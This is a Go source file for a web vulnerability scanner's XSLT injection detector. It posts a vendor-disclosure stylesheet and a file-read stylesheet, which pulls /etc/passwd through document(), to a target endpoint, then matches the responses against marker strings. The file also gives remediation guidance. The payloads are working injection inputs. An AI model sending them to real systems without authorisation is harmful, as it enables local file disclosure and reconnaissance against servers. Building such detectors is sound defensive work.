// Package xslt detects server-side XSL-Transformation injection. The
// attack surface is any endpoint that accepts an XML body and applies
// an XSL stylesheet to it: by smuggling an attacker-controlled
// `<xsl:stylesheet>` block into the input, the attacker can:
//   - leak system properties via `<xsl:value-of select="system-property('xsl:vendor')"/>`,
//   - read local files via `document('file:///etc/passwd')`,
//   - run code via Saxon/Xalan extension namespaces.
//
// The probe sends two POSTs per target: a benign baseline and a
// payload containing a vendor-disclosure stylesheet. A response that
// echoes "Apache" / "Saxonica" / "libxslt" / similar canary strings,
// or that includes `/etc/passwd`-shaped output, is the signal.
package xslt

import (
	"context"
	"fmt"
	"strings"

	"github.com/TyrusRC/swiss-knife-for-web-security/internal/core"
	skwshttp "github.com/TyrusRC/swiss-knife-for-web-security/internal/http"
)

// vendorMarkers identify XSLT engines the payload should disclose.
var vendorMarkers = []string{
	"Saxonica", "Apache", "libxslt", "libxml2", "Microsoft-XML",
	"Xalan", "SAXON", "DataPower", "Norman Walsh",
}

// fileMarkers identify successful local-file disclosure via document().
var fileMarkers = []string{"root:x:0:0", "127.0.0.1\tlocalhost", "127.0.0.1 localhost"}

// vendorPayload requests three system properties at once. Any engine
// will emit at least one — the union of vendorMarkers covers them.
const vendorPayload = `<?xml version="1.0"?>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">
<xsl:template match="/">
SKWS_XSLT_VENDOR=<xsl:value-of select="system-property('xsl:vendor')"/>
SKWS_XSLT_VERSION=<xsl:value-of select="system-property('xsl:version')"/>
SKWS_XSLT_LANG=<xsl:value-of select="system-property('xsl:vendor-url')"/>
</xsl:template>
</xsl:stylesheet>`

// fileReadPayload tries to read /etc/passwd via document().
const fileReadPayload = `<?xml version="1.0"?>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">
<xsl:template match="/">
<xsl:copy-of select="document('file:///etc/passwd')"/>
</xsl:template>
</xsl:stylesheet>`

// baselineBody is a syntactically valid XML body that should not
// trigger any XSLT side-effects when the server is not vulnerable.
const baselineBody = `<?xml version="1.0"?><doc><probe>baseline</probe></doc>`

// Detector probes targetURL for XSLT injection.
type Detector struct {
	client *skwshttp.Client
}

// New returns a Detector wired to the project's shared HTTP client.
func New(client *skwshttp.Client) *Detector {
	return &Detector{client: client}
}

// Result carries findings from Detect.
type Result struct {
	Findings []*core.Finding
}

// Detect POSTs the vendor-disclosure stylesheet, then the file-read
// stylesheet, to targetURL with Content-Type: application/xml. A
// vendor marker emits High; a file marker emits Critical.
func (d *Detector) Detect(ctx context.Context, targetURL string) (*Result, error) {
	res := &Result{}
	if d.client == nil {
		return res, nil
	}

	baseResp, err := d.client.SendRawBody(ctx, targetURL, "POST", baselineBody, "application/xml")
	if err != nil || baseResp == nil {
		return res, nil
	}

	// Vendor-disclosure probe.
	probeVendor, err := d.client.SendRawBody(ctx, targetURL, "POST", vendorPayload, "application/xml")
	if err == nil && probeVendor != nil && probeVendor.StatusCode >= 200 && probeVendor.StatusCode < 500 {
		if marker, ok := containsAny(probeVendor.Body, vendorMarkers); ok && !contains(baseResp.Body, marker) {
			res.Findings = append(res.Findings, buildFinding(targetURL, "vendor-disclosure", marker, probeVendor.Body, core.SeverityHigh))
			// Don't return — file-read is a higher-impact follow-up.
		}
	}

	// File-read probe.
	probeFile, err := d.client.SendRawBody(ctx, targetURL, "POST", fileReadPayload, "application/xml")
	if err == nil && probeFile != nil && probeFile.StatusCode >= 200 && probeFile.StatusCode < 500 {
		if marker, ok := containsAny(probeFile.Body, fileMarkers); ok && !contains(baseResp.Body, marker) {
			res.Findings = append(res.Findings, buildFinding(targetURL, "file-read", marker, probeFile.Body, core.SeverityCritical))
		}
	}
	return res, nil
}

func contains(haystack, needle string) bool {
	return strings.Contains(haystack, needle)
}

func containsAny(haystack string, needles []string) (string, bool) {
	for _, n := range needles {
		if strings.Contains(haystack, n) {
			return n, true
		}
	}
	return "", false
}

func buildFinding(target, kind, marker, body string, sev core.Severity) *core.Finding {
	finding := core.NewFinding("XSLT Injection", sev)
	finding.URL = target
	finding.Parameter = kind
	finding.Tool = "xslt"
	finding.Confidence = core.ConfidenceHigh
	finding.Description = fmt.Sprintf(
		"The endpoint accepted an attacker-controlled XSL stylesheet and emitted a %s marker (%q). The XML body is fed into a server-side XSLT processor without sandboxing, opening file-read, system-property disclosure, and (depending on processor) RCE via extension namespaces.",
		kind, marker,
	)
	preview := body
	if len(preview) > 240 {
		preview = preview[:237] + "..."
	}
	finding.Evidence = fmt.Sprintf("Probe kind: %s\nMarker: %q\nResponse snippet: %s", kind, marker, preview)
	finding.Remediation = "Disable XSLT processing if it isn't required. If it is, run it in a sandboxed processor (e.g. Saxon-HE with `setURIResolver` denying file://; Apache Xalan with the SecureProcessing feature). Reject any document() / system-property / extension-namespace constructs that arrive in user-supplied stylesheets."
	finding.WithOWASPMapping(
		[]string{"WSTG-INPV-11"},
		[]string{"A03:2025"},
		[]string{"CWE-91"},
	)
	finding.APITop10 = []string{"API3:2023", "API8:2023"}
	return finding
}
